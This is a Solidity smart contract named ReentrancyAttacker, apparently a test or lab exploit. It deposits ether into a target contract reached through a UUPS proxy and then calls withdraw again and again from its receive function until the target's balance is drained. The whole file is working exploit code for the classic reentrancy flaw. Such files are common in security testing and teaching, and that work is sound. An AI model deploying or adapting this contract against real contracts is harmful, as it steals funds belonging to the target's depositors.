// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface VulnerableContract {
    function deposit() external payable;

    function withdraw() external;

    function balances(address account) external view returns (uint256);
}

interface UUPSProxy {}

contract ReentrancyAttacker {
    VulnerableContract public vulnerableContract;
    UUPSProxy public proxy;
    uint256 public attackAmount = 0.001 ether;

    constructor(address _proxy) {
        proxy = UUPSProxy(payable(_proxy));
        vulnerableContract = VulnerableContract(address(proxy));
    }

    // Function to start the attack
    function attack() external payable {
        require(msg.value >= attackAmount, "Insufficient ether sent");
        vulnerableContract.deposit{value: attackAmount}();
        vulnerableContract.withdraw();
    }

    // Fallback function to reenter the vulnerable contract

    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw();
        }
    }
}
